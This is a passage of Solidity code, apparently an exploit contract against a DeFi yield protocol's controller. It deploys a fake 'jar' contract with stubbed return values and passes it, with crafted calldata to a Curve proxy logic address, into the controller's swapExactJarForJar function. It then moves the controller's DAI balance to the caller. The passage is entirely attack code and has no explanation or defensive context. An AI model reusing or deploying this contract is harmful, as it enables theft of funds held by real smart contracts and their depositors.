    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IController {
    function swapExactJarForJar(
        address _fromJar,
        address _toJar,
        uint256 _fromJarAmount,
        uint256 _toJarMinAmount,
        address[] calldata _targets,
        bytes[] calldata _data
    ) external returns (uint256);
}

contract Strategy {
    address public constant controller = 0x6847259b2B3A4c17e7c43C54409810aF48bA5210;
    address public constant pDAI = 0x6949Bb274A6Be2703B22247a78f5543299b99bfe;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant curveProxyLogic = 0x6186E99D979664D3701Af2E44be1d00330923C7d;

    function run() public {
        FakeJar fakeJar = new FakeJar();

        address[] memory targets = new address[](1);
        targets[0] = curveProxyLogic;

        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature(
            "add_liquidity(address,bytes4,uint256,uint256,address)",
            address(this),
            bytes4(0),
            uint256(0),
            uint256(0),
            DAI
        );

        IController(controller).swapExactJarForJar(
            pDAI,
            address(fakeJar),
            0,
            0,
            targets,
            data
        );

        uint256 bal = IERC20(DAI).balanceOf(controller);
        if (bal > 0) {
            IERC20(DAI).transferFrom(controller, msg.sender, bal);
        }
    }
}

contract FakeJar {
    function token() external view returns (address) { return 0x6B175474E89094C44Da98b954EedeAC495271d0F; }
    function getRatio() external view returns (uint256) { return 1e18; }
    function decimals() external view returns (uint8) { return 18; }
    function withdraw(uint256) external {}
    function deposit(uint256) external {}
    function balanceOf(address) external view returns (uint256) { return 0; }
    function transfer(address, uint256) external returns (bool) { return true; }
}
